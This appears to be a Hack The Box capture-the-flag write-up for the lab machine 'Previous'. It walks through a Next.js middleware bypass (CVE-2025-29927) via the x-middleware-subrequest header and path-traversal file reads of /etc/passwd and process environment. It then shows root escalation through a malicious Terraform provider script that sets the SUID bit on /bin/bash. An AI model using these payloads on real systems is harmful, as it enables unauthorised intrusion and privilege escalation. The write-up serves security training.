- - - 
created : 10-09-2025 

Tags : #medium 

Released on 23 Aug 2025 (Season 8)
- - - 
# Recon
## Rustscan - Nmap

First we add the target IP to our /etc/hosts file, then we use [Rustscan](../../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ rustscan -a previous.htb -- -A 

Open 10.10.11.83:22
Open 10.10.11.83:80

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-title: PreviousJS
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD

```
# Enumeration
## HTTP (80)

We have a login page:

![Pasted image 20250910203134.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250910203134.png)

There's an email address in the [Source Code](../../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md):

![Pasted image 20250910202931.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250910202931.png)

`jeremy` seems the dev username.
### Gobuster

We can use [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) on the target :

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt  -u http://previous.htb

/docs                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fdocs]
/api                  (Status: 307) [Size: 35] [--> /api/auth/signin?callbackUrl=%2Fapi]
/signin               (Status: 200) [Size: 3481]
/docsis               (Status: 307) [Size: 38] [--> /api/auth/signin?callbackUrl=%2Fdocsis]
/apis                 (Status: 307) [Size: 36] [--> /api/auth/signin?callbackUrl=%2Fapis]
/docserver            (Status: 307) [Size: 41] [--> /api/auth/signin?callbackUrl=%2Fdocserver]

```
### FFuf

[FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for subdomains fuzzing:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -H 'Host: FUZZ.previous.htb' -u http://previous.htb -fs 154 -c 

```

Seems there's nothing.
## Infos

Trying login on browser doesn't work, let's intercept the request with [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) (you can check other write-ups for mini-tutorials):

![Pasted image 20250910205129.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250910205129.png)

![Pasted image 20250910215211.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250910215211.png)

So we have Next.js api service and it's route, we can see it from `next-auth.csrf-token` .
# Exploit
## Auth Bypass in Next.js

[CVE-2025-29927](../../../3%20-%20Tags/CVEs/CVE-2025-29927.md)
- **Affected Versions**:
    - 13.0.0 - 13.5.8
    - 14.0.0 - 14.2.24
    - 15.0.0 - 15.2.2
    - 11.1.4 - 12.3.4

Next.js uses an internal header `x-middleware-subrequest` to prevent recursive requests. This vulnerability allows attackers to **bypass middleware security checks** by manipulating this header.

Version information was derived from values in the X-Powered-By header of Next.js _Target Next.js version: 15.1.7_

```js
=== Next.js CVE-2025-29927 Middleware Bypass Tester ===
Target: http://localhost:3000/dashboard

Testing vulnerability...
Normal request status: 307
Bypass request status: 200
```

```js
=== Next.js CVE-2025-29927 Middleware Bypass Tester ===

Target: http://localhost:3000/dashboard

Testing vulnerability...
Making request without bypass header...
Making request with bypass header...
Normal request status: 307
Bypass request status: 307

✓ NOT VULNERABLE - Protected Route
The route is protected and the bypass attempt was unsuccessful
Normal request redirected to: /
Bypass request redirected to: /
```

If we send a request to the `protected` path, we can see that it redirects directly with status code `307`.
### Next.js v15.2.3 Loop Bypass:

In the [v15.2.3](https://github.com/vercel/next.js/releases/tag/v15.2.3) version of Next.js, the `middleware` can be bypassed thanks to the value received from the header. This is due to the 5 repetitive loop control.

```http
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```

We can try it here:

![Pasted image 20250911130612.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911130612.png)

We got it:

![Pasted image 20250911132247.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911132247.png)

We can access the endpoint without any problems, the `middleware` is being ignored. _Target Next.js version: 15.1.7_

Using [Gobuster](../../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) again for `/api`:

```bash
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/actions.txt -u  http://previous.htb/api/ -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -H "Cookie: next-auth.csrf-token=7b03f039871d4246c15078179e525e3c631d6c7c550cee0e24116f6ffff044bf%7C4211754957126f3a4ef8f37880e36c1d3e7e574ccc606477f395a751bcc36d32; next-auth.callback-url=http%3A%2F%2Flocalhost%3A3000" -t 50 

/download             (Status: 400) [Size: 28]

#### with -w /usr/share/wordlists/seclists/Discovery/Web-Content/api/api-endpoints.txt  

/api/docs/            (Status: 308) [Size: 18] [--> /api/docs/api/docs]
/api/v1/delta/monitoring/accounts/ (Status: 308) [Size: 42] [--> /api/docs/api/v1/delta/monitoring/accounts]                                                                                                  
/swagger/             (Status: 308) [Size: 17] [--> /api/docs/swagger]
/v2/auction/          (Status: 308) [Size: 20] [--> /api/docs/v2/auction]
/v1/                  (Status: 308) [Size: 12] [--> /api/docs/v1]
/v2/                  (Status: 308) [Size: 12] [--> /api/docs/v2]

```

Using [FFuf](../../../3%20-%20Tags/Hacking%20Tools/FFuf.md) again to fuzz for`/download` parameters:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ ffuf -w /home/mdn0x/HTB/Machines/Planning/fuzzDicts/paramDict/AllParam.txt -u 'http://previous.htb/api/download?FUZZ=a' -H  "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -c -mc all -fw 2

________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=a
 :: Wordlist         : FUZZ: /home/mdn0x/HTB/Machines/Planning/fuzzDicts/paramDict/AllParam.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 92ms]
```

This parameter is used for files download.
### LFI

Using `curl` we can find [Local File Inclusion (LFI)](../../../3%20-%20Tags/Hacking%20Concepts/Local%20File%20Inclusion%20(LFI).md) vulnerability in the `example` parameter:

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ curl 'http://previous.htb/api/download?example=../../../../etc/passwd' -H  "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

2 users here: `node` & `nextjs` 

We can use [Caido](../../../3%20-%20Tags/Hacking%20Tools/Caido.md) too, we check the environment variables:

![Pasted image 20250911175122.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911175122.png)

**Why `/proc/self/environ`?**

- In Linux, `/proc/self/` is a symlink to the current process
- `environ` contains all environment variables for that process

Now we know the directory is `/app`, if we search for Next.js directory structure we find an interesting directory `/.next` which contains routing configs:

![Pasted image 20250911180029.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911180029.png)

Next.js stores routing information in manifest.
**Key Discovery**: Dynamic route `/api/auth/[...nextauth]` - This is a NextAuth.js authentication endpoint!
Let's see it, the route uses bracket notation, which needs URL encoding:

![Pasted image 20250911180406.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911180406.png)

And we have the password for `jeremy`
## Initial Access SSH (22)

We can use the credentials to access the machine on [SSH](../../../3%20-%20Tags/Hacking%20Concepts/SSH.md):  MyNameIsJeremyAndILovePancakes

```bash
┌──(mdn0x㉿mdn0xKali)-[~/HTB/Machines/Previous]
└─$ ssh jeremy@previous.htb 

eremy@previous:~$ ls
docker  privesc  user.txt
jeremy@previous:~$ cat user.txt 
  HTB{{REDACTED_FLAG}}
```
# Privilege Escalation

We start [Privilege Escalation](../../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) checking for special permissions:

```bash
jeremy@previous:~$ sudo -l
[sudo] password for jeremy: 
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Checking the command:

```bash
jeremy@previous:~$ terraform
Usage: terraform [global options] <subcommand> [args]

The available commands for execution are listed below.
The primary workflow commands are given first, followed by
less common or more advanced commands.

Main commands:
  init          Prepare your working directory for other commands
  validate      Check whether the configuration is valid
  plan          Show changes required by the current configuration
  apply         Create or update infrastructure
  destroy       Destroy previously-created infrastructure

All other commands:
  console       Try Terraform expressions at an interactive command prompt
  fmt           Reformat your configuration in the standard style
  force-unlock  Release a stuck lock on the current workspace
  get           Install or upgrade remote Terraform modules
  graph         Generate a Graphviz graph of the steps in an operation
  import        Associate existing infrastructure with a Terraform resource
  login         Obtain and save credentials for a remote host
  logout        Remove locally-stored credentials for a remote host
  metadata      Metadata related commands
  modules       Show all declared modules in a working directory
  output        Show output values from your root module
  providers     Show the providers required for this configuration
  refresh       Update the state to match remote systems
  show          Show the current state or a saved plan
  stacks        Manage HCP Terraform stack operations
  state         Advanced state management
  taint         Mark a resource instance as not fully functional
  test          Execute integration tests for Terraform modules
  untaint       Remove the 'tainted' state from a resource instance
  version       Show the current Terraform version
  workspace     Workspace management

Global options (use these before the subcommand, if any):
  -chdir=DIR    Switch to a different working directory before executing the
                given subcommand.
  -help         Show this help output or the help for a specified subcommand.
  -version      An alias for the "version" subcommand.
```

If we search about this tool we can have more infos:

	Terraform is an IaC (Infrastructure as Code) tool used to define deploy, and manage cloud resources or on-premises infrastructure.

On the [official website](https://developer.hashicorp.com/terraform/cli/config/environment-variables) we can check the environment variables that can be used:

![Pasted image 20250911195333.png](../../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250911195333.png)

We can find `/privesc` directory in home, and see the files:

```bash
jeremy@previous:~/privesc$ cat dev.tfrc 
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/privesc"
  }
  direct {}
}

```

We can create a provider program,`dev_overrides` points in the `/privesc` directory:

```bash
jeremy@previous:~/privesc$ nano terraform-provider-examples_v0.1_linux_amd64

jeremy@previous:~/privesc$ cat terraform-provider-examples_v0.1_linux_amd64 
#! /bin/bash
chmod u+s /bin/bash

jeremy@previous:~/privesc$ chmod +x terraform-provider-examples_v0.1_linux_amd64 
```

We can try to use Terraform after [PATH hijacking](../../../3%20-%20Tags/Hacking%20Concepts/PATH%20hijacking.md) :

```bash
jeremy@previous:~/privesc$ rm terraform-provider-examples_v1.0.1 

jeremy@previous:~/privesc$ export TF_CLI_CONFIG_FILE=/home/jeremy/privesc/dev.tfrc

jeremy@previous:~/privesc$ sudo /usr/bin/terraform -chdir\=/opt/examples apply
╷
│ Warning: Provider development overrides are in effect
│ 
│ The following provider development overrides are set in the CLI configuration:
│  - previous.htb/terraform/examples in /home/jeremy/privesc
│ 
│ The behavior may therefore not match any released version of the provider and applying changes may
│ cause the state to become incompatible with published releases.
╵
╷
│ Error: Failed to load plugin schemas
│ 
│ Error while loading schemas for plugin components: Failed to obtain provider schema: Could not load
│ the schema for provider previous.htb/terraform/examples: failed to instantiate provider
│ "previous.htb/terraform/examples" to obtain schema: Unrecognized remote plugin message: 
│ Failed to read any lines from plugins stdout
│ This usually means
│   the plugin was not compiled for this architecture,
│   the plugin is missing dynamic-link libraries necessary to run,
│   the plugin is not executable by this process due to file permissions, or
│   the plugin failed to negotiate the initial go-plugin protocol handshake
│ 
│ Additional notes about plugin:
│   Path: /home/jeremy/privesc/terraform-provider-examples_v0.1_linux_amd64
│   Mode: -rwxrwxr-x
│   Owner: 1000 [jeremy] (current: 0 [root])
│   Group: 1000 [jeremy] (current: 0 [root])
│ ..
╵
jeremy@previous:~/privesc$ ls -la /bin/bash
-rwsr-xr-x 1 root root 1396520 Mar 14  2024 /bin/bash
jeremy@previous:~/privesc$ bash -p

bash-5.1# cat /root/root.txt
  HTB{{REDACTED_FLAG}}
```

Pwned !